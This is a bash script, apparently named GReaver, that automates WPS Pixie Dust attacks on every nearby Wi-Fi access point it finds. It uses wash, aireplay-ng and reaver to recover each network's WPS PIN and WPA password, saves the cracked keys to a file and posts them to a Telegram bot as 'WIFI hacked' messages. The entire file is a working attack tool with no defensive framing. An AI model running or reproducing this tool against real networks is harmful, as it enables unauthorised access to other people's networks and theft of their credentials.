#!/bin/bash

# ══ Regular color ════════╗ START ╔═
    BK=$(tput setaf 232)  # Black
    GY=$(tput setaf 246)  # Gray
    RD=$(tput setaf 160)  # Red
    GR=$(tput setaf 46)   # Green
    YW=$(tput setaf 226)  # Yellow
    OR=$(tput setaf 208)  # Orange
    BL=$(tput setaf 80)   # Blue
    MG=$(tput setaf 129)  # Magenta
    PR=$(tput setaf 198)  # Purple
    CY=$(tput setaf 14)   # Cyan
    WH=$(tput setaf 15)   # White
    NM=$(tput sgr0)       # Norm
    BD=$(tput bold)       # Bold
    BG=$(tput setab 3)    # Background Color
# ══ Regular color ════════╝  END  ╚═

# ══ Move cursor ════════╗ START ╔═
    SVC=$(tput sc)      # save position
    RSC=$(tput rc)      # restore position
    NRC=$(tput cnorm)   # back position to norm
    UPC=$(tput cuu1)    # up position 1 line
    DWC=$(tput cud1)    # down position 1 line
    LFC=$(tput cub1)    # left position 1 line
    RGC=$(tput cuf1)    # right position 1 line
    CL1=$(tput el)      # clean line <==|
    CL2=$(tput el1)     # clean line |==>
# ══ Move cursor ════════╝  END  ╚═

#╔═╗ VAR ╔════════════════════════════════════╗ START ╔════╗ */
    OST_TARGET="0"
    ApiBot=`cat /${USER}/MyScript/setting/telegrambot | grep "api_key" | awk -F ' ' '{print $2}'`
    Chat_id=`cat /${USER}/MyScript/setting/telegrambot | grep "id_chat" | awk -F ' ' '{print $2}'`
#╚═╝ VAR ╚════════════════════════════════════╝  END  ╚════╝ */

#╔══════════════════════════════════════════════╗
#║  Verify the folder of Temporary files
#╚══════════════════════════════════════════════╝
    GReaver_FOLDER="GReaver$(date "+%T" | tr -d ":")"
    Temp_GReaver="/tmp/${GReaver_FOLDER}"
    Dir=`ls /tmp | grep -E ^${GReaver_FOLDER}$`
        if [ "$Dir" != "" ];then
          rm -rf ${Temp_GReaver}
          mkdir ${Temp_GReaver}
        else
          mkdir ${Temp_GReaver}
        fi
#╚══════════════════════════════  End Function ═╝

#╔══════════════════════════════════════════════╗
#║  Folder for rezult
#╚══════════════════════════════════════════════╝
    Dir_Result=`ls /${USER}/MyOUTPUT | grep -E wifi`
    if [ "$Dir_Result" == "" ];then
        mkdir /${USER}/MyOUTPUT/wifi
    fi
    File_Result=`ls /${USER}/MyOUTPUT/wifi | grep -E WIFI_PASS`
    if [ "$File_Result" == "" ];then
        echo -e " date, essid, bssid, password, pin" > /${USER}/MyOUTPUT/wifi/WIFI_PASS.txt
    fi
#╚══════════════════════════════  End Folder for rezult ═╝

#╔══════════════════════════════════════════════╗
#║  Create table
#╚══════════════════════════════════════════════╝
    FUNC_create_tabl()   {
        max_lf=""
        max_rh=""
        S=${#WORD}
        let IZ=${S}%2
        MIN=$((($MAX-$S)/2))
        for (( STIND=0;STIND<${MIN};STIND++))
                do
                    max_lf=${max_lf}' '
        done
        if [ $IZ == 0 ]
            then
                for (( STIND=0;STIND<${MIN};STIND++))
                        do
                            max_rh=${max_rh}' '
                done
            else
                for (( STIND=0;STIND<=${MIN};STIND++))
                        do
                            max_rh=${max_rh}' '
                done
        fi
    }
#╚══════════════════════════════  End Create table ═╝

#╔══════════════════════════════════════════════╗
#║  Exit and Clear temp files
#╚══════════════════════════════════════════════╝
    FUNC_exit_function() {
        if [[ "Num_targets" -eq "0" ]]
            then
                killall reaver &>/dev/null
                killall wash &>/dev/null
                killall xterm &>/dev/null
                killall tail &>/dev/null
                OST_TARGET=$(($OST_TARGET*2+1))
                rc_dw_tr="\e[${OST_TARGET}B"
                echo -e "${NM}${rc_dw_tr}"
                echo -e " ${NM}${WH} [${NM}${RD}!${NM}${WH}] Remove temporary file ."
                rm -rf ${Temp_GReaver}
                sleep 1
                echo ""
                exit
            else
                oi=0
        fi
    }
#╚══════════════════════════════  End Exit and Clear temp files ═╝

#╔══════════════════════════════════════════════╗
#║  Save result attack
#╚══════════════════════════════════════════════╝
    FUNC_save_PASS ()
        {
            ITDATE=`date +%d-%m-%Y`
            echo -e " $ITDATE, $ESSID, $BSSID, $KEY, ${PIN}" >> /${USER}/MyOUTPUT/wifi/WIFI_PASS.txt
            echo -e $KEY >> /${USER}/MyScript/dic/one/kill.txt
            if [[ -n ${ApiBot} && -n ${Chat_id} ]]
                then
                    MSGBOT="WIFI hacked -> ${ESSID} : ${KEY}"
                    SENDTOBOT=`curl -s "https://api.telegram.org/${ApiBot}/sendMessage?chat_id=${Chat_id}&text=${MSGBOT}" &>/dev/null`
            fi
        }
#╚══════════════════════════════  End Save result attack ═╝

#╔══════════════════════════════════════════════╗
#║  Start Wash 7 find targets
#╚══════════════════════════════════════════════╝
    FUNC_Washed()
        {
            clear
            echo -e ""
            echo -en "${NM}${WH}  [${NM}${RD}!${NM}${WH}] ${NM}Ignore found targets? [${NM}${WH}${NM}${RD}Y${NM}${CY}/${NM}${WH}n${NM}] ${BD}${CY}> ${BD}${RD}"
            read IGNORE
            if [ "$IGNORE" == "Y" -o -z "$IGNORE" ];
                then
                    cat /${USER}/MyOUTPUT/wifi/WIFI_PASS.txt | grep -E -a -o '[0-9,aAbBcCdDeEfF]{1,2}(\:[0-9,aAbBcCdDeEfF]{1,2}){5}' | sort -u > ${Temp_GReaver}/ignore_list.txt
                else
                    echo -en "" > ${Temp_GReaver}/ignore_list.txt
            fi
            clear
            echo -e ""
            echo -en "${NM}${WH}  [${NM}${RD}!${NM}${WH}] ${NM}Enter search time [${NM}${WH}>10s${NM}] ${BD}${CY}> ${BD}${RD}"
            read itm
            if [[ -n "$itm" ]];
                then
                    if [[ "$itm" -gt 10 ]];
                        then
                            tm="$itm"
                        else
                            tm=45
                    fi
                else
                    tm=45
            fi
            clear
            timeout ${tm} wash -i $INFACE -a > ${Temp_GReaver}/mac.txt &
            Wash_PID="$!"
            disown $Wash_PID
        }
#╚══════════════════════════════  End Start Wash 7 find targets ═╝

#╔══════════════════════════════════════════════╗
#║  Break attack reaver
#╚══════════════════════════════════════════════╝
    FUNC_Stopnext ()
        {
            killall reaver
            echo "** Trapped CTRL-C"
        }
#╚══════════════════════════════  End Break attack reaver ═╝

#╔══════════════════════════════════════════════╗
#║  Grep MAC targets
#╚══════════════════════════════════════════════╝
    FUNC_Grepmac()
        {
            GREP_MAC=$(grep -w 'No' ${Temp_GReaver}/mac.txt | grep -E -a -o '[0-9,aAbBcCdDeEfF]{1,2}(\:[0-9,aAbBcCdDeEfF]{1,2}){5}')
            GREP_VENDOR=$(grep -w 'BSSID' ${Temp_GReaver}/mac.txt | grep -w 'Vendor')
            if [[ -n "$GREP_VENDOR" ]]
                then
                    NUM_LETTERS=50
                else
                    NUM_LETTERS=38
            fi
            echo "$GREP_MAC" > ${Temp_GReaver}/targets_tmp.txt
            echo -en "" > ${Temp_GReaver}/targets.txt
            while read ignore_target
                do
                    sed -i "/${ignore_target}/d" ${Temp_GReaver}/targets_tmp.txt
            done < ${Temp_GReaver}/ignore_list.txt
            while read BSSID_TMP
                do
                    POWER_TMP=$(grep $BSSID_TMP ${Temp_GReaver}/mac.txt | awk '{print $3}')
                    PWR_TMP=`expr $POWER_TMP + 100`
                    if [[ -n "$PWR_TMP" && "$PWR_TMP" -gt "10" ]]
                        then
                            echo "$BSSID_TMP" >> ${Temp_GReaver}/targets.txt
                    fi
            done < ${Temp_GReaver}/targets_tmp.txt
            Num_targets=`cat ${Temp_GReaver}/targets.txt 2> /dev/null | wc -l`
            ID_target="1"
            echo ""
            echo -e "${NM}${WH}  +${NM}${CY}--------------------------${NM}${WH}+"
            if [[ "$Num_targets" -lt 10 ]];
                then
                    echo -e "${NM}${CY}  |${NM}${WH} [${NM}${RD}+${NM}${WH}]${NM}${YW} Found targets ${NM}${GR}>  ${BD}${RD}$Num_targets${NM}${CY}   |             ${NM}${PR}-= ${BD}${YW}PixieWPS Attack ${NM}${PR}=-          "
                else
                    echo -e "${NM}${CY}  |${NM}${WH} [${NM}${RD}+${NM}${WH}]${NM}${YW} Found targets ${NM}${GR}>  ${BD}${RD}$Num_targets${NM}${CY}  |             ${NM}${PR}-= ${BD}${YW}PixieWPS Attack ${NM}${PR}=-          "
            fi
            echo -e "${NM}${WH}  +${NM}${CY}----${NM}${WH}+${NM}${CY}---------------------${NM}${WH}+${NM}${CY}----------------${NM}${WH}+${NM}${CY}------------------------------${NM}${WH}+"
            echo -e "${NM}${CY}  |${BD}${RD} ID ${NM}${CY}|        ${BD}${BL}BSSID        ${NM}${CY}|      ${BD}${PR}PINs      ${NM}${CY}|          ${BD}${WH}PASSWORDS           ${NM}${CY}|"
            echo -e "${NM}${WH}  +${NM}${CY}----${NM}${WH}+${NM}${CY}---------------------${NM}${WH}+${NM}${CY}----------------${NM}${WH}+${NM}${CY}------------------------------${NM}${WH}+"
            while read MAC
                do
                    ESSID=$(grep $MAC ${Temp_GReaver}/mac.txt | grep -w 'No' | cut -c ${NUM_LETTERS}-)
                    POWER=$(grep $MAC ${Temp_GReaver}/mac.txt | awk '{print $3}')
                    PWR=`expr $POWER + 100`
                    if [[ "$PWR" -le "20" ]]
                        then
                            PWR="\e[1;31m ${PWR}"
                        else
                            if [[ "$PWR" -le "30" ]]
                                then
                                    PWR="\e[1;33m ${PWR}"
                                else
                                    PWR="\e[1;32m ${PWR}"
                            fi
                    fi
                    if [[ "$ID_target" -lt 10 ]];
                        then
                            echo -e "${NM}${CY}  |${NM}${RD} 0$ID_target ${NM}${CY}|  ${NM}$MAC  ${NM}${CY}|      ${NM}${PR}Wait..    ${NM}${CY}|              ${NM}${WH}NO              ${NM}${CY}|${NM}${BL}>> ${BD}${CY}$ESSID ${NM}${WH}(${BD}${PR}P:${PWR}${NM}${WH})"
                        else
                            echo -e "${NM}${CY}  |${NM}${RD} $ID_target ${NM}${CY}|  ${NM}$MAC  ${NM}${CY}|      ${NM}${PR}Wait..    ${NM}${CY}|              ${NM}${WH}NO              ${NM}${CY}|${NM}${BL}>> ${BD}${CY}$ESSID ${NM}${WH}(${BD}${PR}P:${PWR}${NM}${WH})"
                    fi
                    echo -e "${NM}${WH}  +${NM}${CY}----${NM}${WH}+${NM}${CY}---------------------${NM}${WH}+${NM}${CY}----------------${NM}${WH}+${NM}${CY}------------------------------${NM}${WH}+"
                    ID_target=$(($ID_target+1))
            done < ${Temp_GReaver}/targets.txt
            echo ""
        }
#╚══════════════════════════════  End Grep MAC targets ═╝

#╔══════════════════════════════════════════════╗
#║  Start attack Reaver
#╚══════════════════════════════════════════════╝
    FUNC_Reav()
        {
            r=16
            rh_tr="\e[${r}C"
            CHANNEL=$(grep $BSSID ${Temp_GReaver}/mac.txt | awk '{print $2}')
            if [[ -n "$CHANNEL" ]];
                then
                    iw dev $INFACE set channel $CHANNEL 2> /dev/null
            fi
            ESSID=$(grep $BSSID ${Temp_GReaver}/mac.txt | grep -w 'No' | sed 's/ /_/g' | cut -c ${NUM_LETTERS}-)
            if [ "$ESSID" == "" ];then
                ESSID="unknown_${Num_targets}"
            fi
            POWER=$(grep $BSSID ${Temp_GReaver}/mac.txt | awk '{print $3}')
            PWR=`expr $POWER + 100`
            ITSWORKING=`aireplay-ng $INFACE -9 -a $BSSID -e $ESSID | grep "Injection is working"`
            if [[ -n "$ITSWORKING" ]];
                then
                if [[ -n "$PWR" && "$PWR" -gt "10" ]];
                    then
                        echo -en "${RSC}${BD}${RD}Start attack."
                        xterm -e "aireplay-ng $INFACE -1 120 -a $BSSID -e $ESSID" &> /dev/null &
                        Aireplay_PID="$!"
                        disown $Aireplay_PID
                        if [[ -n "$CHANNEL" ]];
                            then
                                x=$(reaver -i $INFACE -s /usr/local/etc/$BSSID.wpc -b $BSSID -c $CHANNEL -S -N -A -vv -K 1 > ${Temp_GReaver}/Get_Result_${ESSID}.txt 2>/dev/null) &
                                Reaver_PID="$!"
                                disown $Reaver_PID
                                xterm -e tail -f ${Temp_GReaver}/Get_Result_${ESSID}.txt &
                                xterm_PID="$!"
                                disown $xterm_PID
                            else
                                x=$(reaver -i $INFACE -s /usr/local/etc/$BSSID.wpc -b $BSSID -S -N -A -vv -K 1 > ${Temp_GReaver}/Get_Result_${ESSID}.txt 2>/dev/null) &
                                Reaver_PID="$!"
                                disown $Reaver_PID
                                xterm -e tail -f ${Temp_GReaver}/Get_Result_${ESSID}.txt &
                                xterm_PID="$!"
                                disown $xterm_PID
                        fi
                        oi=60
                        while [[ "$oi" -ne 0 ]]; do
                            if [[ "$oi" -lt 10 ]];
                                then
                                    echo -en "${RSC}${BD}${RD}Attacking${BD}${YW} 0$oi"
                                else
                                    echo -en "${RSC}${BD}${RD}Attacking${BD}${YW} $oi "
                            fi
                            PID_search=$(ps | grep $Reaver_PID)
                            PID_search_2=$(ps | grep $Aireplay_PID)
                            if [[ -n "$PID_search" ]];
                                then
                                    if [[ -n "$PID_search_2" ]];
                                        then
                                            oi=$(($oi-1))
                                            sleep 1
                                        else
                                            oi=0
                                    fi      
                                else
                                    oi=0
                            fi      
                        done
                        kill -9 $xterm_PID &> /dev/null
                        kill -9 $Reaver_PID &> /dev/null
                        kill -9 $Aireplay_PID &> /dev/null
                        File_RESULT_REAVER=`ls ${Temp_GReaver} | grep -E Get_Result_${ESSID}`
                        if [ "$File_RESULT_REAVER" == "" ]
                            then
                                RESULT_REAVER=''
                            else
                                RESULT_REAVER=`cat ${Temp_GReaver}/Get_Result_${ESSID}.txt | grep -wF '[+] WPS pin' 2>/dev/null`
                        fi
                        if [[ -n "$RESULT_REAVER" ]]
                            then
                                PIN=`cat ${Temp_GReaver}/Get_Result_${ESSID}.txt | grep -wF "[+] WPS pin" | awk -F ' ' '{print $4}'`
                                SSID=`cat ${Temp_GReaver}/Get_Result_${ESSID}.txt | grep -wF "[+] AP SSID" | awk -F ' ' '{print $4}'`
                                echo -en "${RSC}${BD}${GR}  ${PIN}   "
                                KEY=`cat ${Temp_GReaver}/Get_Result_${ESSID}.txt | grep -wF "[+] WPA PSK" | sed "s/'//g" | awk -F ' ' '{print $4}'`
                                MAX="30"
                                if [[ -n "$KEY" ]]
                                    then
                                        WORD=$KEY
                                    else
                                        WORD='KEY NOT FOUND ${NM}${CY}|'
                                fi
                                FUNC_create_tabl
                                echo -en "${RSC}${rh_tr}${LFC}${BD}${GR}${max_lf}\e[01;38;05;46m${KEY}${max_rh}"
                                FUNC_save_PASS
                            else
                                RESULT=`cat ${Temp_GReaver}/Get_Result_${ESSID}.txt | grep -w 'WPS pin not found' 2>/dev/null`
                                if [[ -n "$RESULT" ]]
                                    then
                                        echo -en "${RSC}${BD}${RD}${LFC}PIN NOT FOUND! ${NM}${CY}|"
                                        echo ""
                                        echo ""
                                    else
                                        FINDPIXIEWPS=`cat ${Temp_GReaver}/Get_Result_${ESSID}.txt | grep -w 'pixiewps -e' 2>/dev/null`
                                        if [[ -n "$FINDPIXIEWPS" ]]
                                            then
                                                echo -en "${RSC}${BD}${RD}   PIXIEWPS   ${NM}${CY}|"
                                                echo ""
                                                echo ""
                                            else
                                                DETECTED=`cat ${Temp_GReaver}/Get_Result_${ESSID}.txt | grep -w 'Detected AP rate limiting' 2>/dev/null`
                                                if [[ -n "$DETECTED" ]]
                                                    then
                                                        echo -en "${RSC}${BD}${RD}   DETECTED   ${NM}${CY}|"
                                                        echo ""
                                                        echo ""
                                                    else
                                                        TIMEOUT=`cat ${Temp_GReaver}/Get_Result_${ESSID}.txt | grep -w 'Receive timeout occurred' 2>/dev/null`
                                                        if [[ -n "$TIMEOUT" ]]
                                                            then
                                                                echo -en "${RSC}${BD}${RD}TIMEOUT EAPL  ${NM}${CY}|"
                                                                echo ""
                                                                echo ""
                                                            else
                                                                WAITING=`cat ${Temp_GReaver}/Get_Result_${ESSID}.txt | grep -w 'Waiting for beacon from' 2>/dev/null`
                                                                if [[ -n "$WAITING" ]]
                                                                    then
                                                                        echo -en "${RSC}${BD}${RD}   WAITING!   ${NM}${CY}|"
                                                                        echo ""
                                                                        echo ""
                                                                    else
                                                                        echo -en "${RSC}${BD}${PR}  No RESULT!! ${NM}${CY}|"
                                                                fi
                                                        fi
                                                fi
                                        fi
                                fi
                        fi
                    else
                        echo -en "${RSC}${BD}${BL} LOW SIGNAL!  "
                fi
                else
                    echo -en "${RSC}${BD}${BL}No Injection! "
            fi
            Num_targets=$(($Num_targets-1))
        }
#╚══════════════════════════════  End Start attack Reaver ═╝

#╔══════════════════════════════════════════════╗
#║  Atatck all targets
#╚══════════════════════════════════════════════╝
    FUNC_Get() {
        OST_TARGET=$OST_TARGET
        i=$(($Num_targets*2+1))
        j=$(($Num_targets*2+1))
        x=32
        y=15
        rc_up_tr="\e[${i}A"
        rc_dw_tr="\e[${j}B"
        rc_rh_tr="\e[${x}C"
        rc_lf_tr="\e[${y}D"
        echo -en "${NM}${rc_up_tr}${rc_rh_tr}${SVC}${BD}${RD} Starting..."
        while read BSSID
            do
            FUNC_Reav
            if [[ "Num_targets" -eq "0" ]]
                then
                    break
            fi
            i=2
            j=2
            x=32
            y=15
            rc_up_tr="\e[${i}A"
            rc_dw_tr="\e[${j}B"
            rc_rh_tr="\e[${x}C"
            rc_lf_tr="\e[${y}D"
            echo -en "${RSC}${rc_dw_tr}${SVC}"
        done < ${Temp_GReaver}/targets.txt
    }
#╚══════════════════════════════  End Atatck all targets ═╝

#╔══════════════════════════════════════════════╗
#║  Basic function
#╚══════════════════════════════════════════════╝
trap FUNC_exit_function SIGINT
INFACENUM=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}' | wc -l`
if [[ "$INFACENUM" -gt 1 ]];
    then
        echo -e " ${NM}${PR}╔════════════════════════╗"
        echo -e " ${NM}${PR}║    ${BD}${YW}SELECT INTERFACE    ${NM}${PR}║"
        echo -e " ${NM}${PR}╚════════════════════════╝"
        echo -en "${BD}${WH}"
        iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'| nl -s ') ' 2>/dev/null
        echo -e " ${NM}${PR}╚════════════════════════╝"
        echo -en " ${SVC}${NM}Enter NUM ${Res}${BD}${CY}> ${BD}${RD}"
        read NUM
        INFACE=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'| nl -s ') ' | grep $NUM | awk '{print $2}'`
        clear
    else
        INFACE=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}'`
fi
if [[ -n "$INFACE" ]]
    then
        FUNC_Washed
        clear
        echo -en "${NM}${DWC}${RGC}${RGC}${SVC} "
        while [[ "$tm" -ne 0 ]]; do
            if [[ "$tm" -lt 10 ]];
                then
                    echo -en "${RSC}${NM}${WH}[${NM}${RD}!${NM}${WH}] ${BD}${GR}Search targets for attack ... ${BD}${RD} 0$tm"
                else
                    echo -en "${RSC}${NM}${WH}[${NM}${RD}!${NM}${WH}] ${BD}${GR}Search targets for attack ... ${BD}${RD} $tm"
            fi
            tm=$(($tm-1))
            sleep 1
            if [[ "$tm" -eq "0" ]];
                then
                    clear
                    FUNC_Grepmac
                    FUNC_Get
                    FUNC_exit_function
            fi
        done
    else
        clear
        echo ""
        echo -e ${NM}${WH}"${NM}${WH}  [${NM}${RD}!${NM}${WH}] ${NM}Wireless Card${NM}${RD} Not Found${NM}${WH} ."
        FUNC_exit_function
fi
#╚══════════════════════════════  End Basic function ═╝
